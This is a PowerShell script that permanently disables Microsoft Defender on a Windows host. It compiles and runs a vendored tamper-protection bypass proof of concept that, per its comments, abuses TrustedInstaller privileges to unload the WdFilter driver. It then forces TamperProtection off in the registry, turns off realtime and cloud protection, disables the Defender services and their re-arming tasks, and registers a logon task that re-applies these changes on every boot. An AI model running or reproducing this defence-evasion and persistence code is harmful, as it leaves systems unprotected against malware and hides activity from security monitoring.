# defender-off.ps1 — PERMANENT Defender decommission (runs elevated, survives reboot)
# Route (proven): AlteredSecurity/Disable-TamperProtection (vendored) unloads WdFilter
# via TrustedInstaller abuse, then TamperProtection is pinned to 4 (off) and all
# realtime policies are disabled. A logon task re-asserts everything on every boot.
# Usage: gsudo powershell -File defender-off.ps1   (or right-click run as admin)
$ErrorActionPreference = 'Continue'
$tmp = 'C:/Users/beebe/AppData/Local/Temp'
$dtp = "$tmp\DTP.exe"
$src = "$PSScriptRoot\..\third_party\Disable-TamperProtection"  # vendored source
$built = "$src\Disable-TamperProtection.exe"

# 0) ensure the POC binary exists (build via portable mingw if missing)
if (-not (Test-Path $built)) {
  Write-Output '[defender-off] building DTP.exe with portable mingw...'
  $gpp = 'C:\Users\beebe\tools\mingw64\mingw64\bin\g++.exe'
  & $gpp -O2 -static -municode -DUNICODE -D_UNICODE "$src\Disable-TamperProtection.cpp" -lfltlib -o $built
}
Copy-Item $built $dtp -Force

# 1) unload WdFilter (deletes its Altitude regkey via TrustedInstaller-privileged reg.exe)
Write-Output '[defender-off] step 1: unload WdFilter'
& $dtp 1 | Out-Null
Start-Sleep -Seconds 2

# 2) disable Tamper Protection (pins Features\TamperProtection = 4)
Write-Output '[defender-off] step 2: tamper protection -> off'
& $dtp 2 | Out-Null
Start-Sleep -Seconds 2
reg add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtection /t REG_DWORD /d 4 /f | Out-Null

# 3) disable every realtime/cloud surface
Write-Output '[defender-off] step 3: disable monitoring surfaces'
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableBlockAtFirstSeen $true -DisableScanOnRealtimeEnable $true -SubmitSamplesConsent 2 -MAPSReporting 0 -ErrorAction SilentlyContinue
Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
sc.exe config WinDefend start= disabled | Out-Null
sc.exe config WdNisSvc start= disabled | Out-Null
sc.exe config Sense start= disabled | Out-Null

# 4) silence the scheduled tasks that re-arm Defender
Get-ScheduledTask -TaskPath '\Microsoft\Windows\Windows Defender\*' -ErrorAction SilentlyContinue | ForEach-Object { Disable-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath | Out-Null }

# 5) re-assert on every logon, forever
$action  = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -ErrorAction SilentlyContinue; sc.exe config WinDefend start= disabled | Out-Null; reg add ''HKLM\SOFTWARE\Microsoft\Windows Defender\Features'' /v TamperProtection /t REG_DWORD /d 4 /f | Out-Null"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName 'menagerie-defender-off' -Action $action -Trigger $trigger -Force | Out-Null

$s = Get-MpComputerStatus
Write-Output ("RTP still enabled: " + $s.RealTimeProtectionEnabled)
Write-Output ("TamperProtection reg: " + (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features').TamperProtection)
Write-Output '[defender-off] if RTP=False above: DONE, permanent. Re-arm via defender-restore.ps1'